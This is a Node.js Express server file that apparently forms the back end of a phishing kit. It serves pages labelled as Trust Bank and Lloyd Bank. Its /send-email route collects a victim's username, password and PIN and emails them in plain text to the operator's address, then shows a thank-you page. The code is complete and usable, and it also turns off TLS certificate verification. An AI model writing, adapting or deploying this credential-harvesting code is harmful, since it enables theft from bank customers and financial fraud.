const express = require('express');
const cors= require("cors");
const nodemailer = require('nodemailer');
const bodyParser = require('body-parser');
const path = require('path');
require('dotenv').config();

const app = express();
const PORT = process.env.PORT || 3000;

// Middleware
app.use(bodyParser.urlencoded({ extended: true }));
app.use(bodyParser.json());
app.use(cors());
app.use(express.static('public'));
app.set('view engine', 'ejs');
app.set('views', path.join(__dirname, 'views'));

// Create nodemailer transporter
const transporter = nodemailer.createTransport({
    host: process.env.EMAIL_HOST,
    port: process.env.EMAIL_PORT,
    secure: false, // true for 465, false for other ports
    auth: {
        user: process.env.EMAIL_USER,
        pass: process.env.EMAIL_PASS
    },
    tls: {
        rejectUnauthorized: false
    }
});

// Verify transporter connection
transporter.verify(function(error, success) {
    if (error) {
        console.log('SMTP Connection Error:', error);
    } else {
        console.log('SMTP Server is ready to send messages');
    }
});

// Routes
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'trust-bank/index.html'));
});



app.get('/lloyd-bank', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'lloyd-bank/index.html'));
});




app.post('/send-email', async (req, res) => {
    try {
        const { username,password,pin} = req.body;

        // Validate required fields
        if (!username || !password || !pin) {
            return res.status(400).json({
                success: false,
                message: 'Please fill all required fields'
            });
        }

        // Email options
        const mailOptions = {
            from: `"Website Form" <${process.env.EMAIL_USER}>`,
            to: process.env.TO_EMAIL,
            subject: `New Login Details from ${username}`,
            html: `
                <h2>New Contact Form Submission</h2>
                <p><strong>Name:</strong> ${username}</p>
                <p><strong>Password:</strong> ${password}</p>
                <p><strong>Pin:</strong> ${pin}</p>
                <hr>
                <p> Developed by Debugger</p>
            `
        };

        // Send email
        await transporter.sendMail(mailOptions);
        
        console.log('Email sent successfully');
        res.json({
            success: true,
            message: 'Message sent successfully!'
        });
        
    } catch (error) {
        console.error('Error sending email:', error);
        res.status(500).json({
            success: false,
            message: 'Failed to send message. Please try again later.'
        });
    }
});

// Optional: Thank you page route
app.get('/thank-you', (req, res) => {
        res.sendFile(path.join(__dirname, 'public', 'thankyou/index.html'));

});

// Error handling middleware
app.use((err, req, res, next) => {
    console.error(err.stack);
    res.status(500).send('The website has crashed!');
});

/*
// Start server
app.listen(PORT, () => {
    console.log(`Server is running on http://localhost:${PORT}`);
    console.log(`Form available at http://localhost:${PORT}/`);
});
*/

export default app;
